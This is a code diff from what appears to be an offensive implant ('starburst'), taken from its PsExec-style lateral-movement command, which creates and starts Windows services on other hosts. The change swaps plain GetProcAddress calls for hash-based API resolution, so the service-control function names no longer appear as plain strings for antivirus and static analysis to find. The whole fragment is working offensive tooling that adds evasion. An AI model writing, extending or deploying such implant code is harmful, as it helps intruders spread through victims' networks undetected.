@@ -103,20 +103,20 @@ auto declfn starburst::cmd_jump_psexec(
     }
 
     auto pOpenSCManagerW = reinterpret_cast<fnOpenSCManagerW>(
-        inst.kernel32.GetProcAddress( h_advapi,
-            symbol<char*>( const_cast<char*>( "OpenSCManagerW" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi ),
+            expr::hash_string( "OpenSCManagerW" ) ) );
     auto pCreateServiceW = reinterpret_cast<fnCreateServiceW>(
-        inst.kernel32.GetProcAddress( h_advapi,
-            symbol<char*>( const_cast<char*>( "CreateServiceW" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi ),
+            expr::hash_string( "CreateServiceW" ) ) );
     auto pStartServiceW = reinterpret_cast<fnStartServiceW>(
-        inst.kernel32.GetProcAddress( h_advapi,
-            symbol<char*>( const_cast<char*>( "StartServiceW" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi ),
+            expr::hash_string( "StartServiceW" ) ) );
     auto pDeleteService = reinterpret_cast<fnDeleteService>(
-        inst.kernel32.GetProcAddress( h_advapi,
-            symbol<char*>( const_cast<char*>( "DeleteService" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi ),
+            expr::hash_string( "DeleteService" ) ) );
     auto pCloseServiceHandle = reinterpret_cast<fnCloseServiceHandle>(
-        inst.kernel32.GetProcAddress( h_advapi,
-            symbol<char*>( const_cast<char*>( "CloseServiceHandle" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi ),
+            expr::hash_string( "CloseServiceHandle" ) ) );
 
     if ( !pOpenSCManagerW || !pCreateServiceW || !pStartServiceW ||
          !pDeleteService || !pCloseServiceHandle ) {
